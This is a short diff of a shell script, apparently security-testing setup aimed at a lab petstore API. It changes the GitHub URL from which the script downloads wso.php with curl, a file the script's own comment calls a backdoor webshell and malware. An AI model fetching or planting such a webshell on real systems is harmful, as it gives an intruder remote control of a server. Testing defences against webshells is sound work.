@@ -5,7 +5,7 @@ PETSTORE_URL='http://petstore.corp.fabriclab.ca/api/v3'
 
 # wso.php is a backdoor/webshell and considered as a malware
 wso_file="wso.php"
-wso_url="https://raw.githubusercontent.com/mIcHyAmRaNe/wso-webshell/master/wso.php"
+wso_url="https://raw.githubusercontent.com/tennc/webshell/master/php/wso/wso.php"
 if [ ! -f "$wso_file" ]; then
     curl -sO $wso_url
 fi
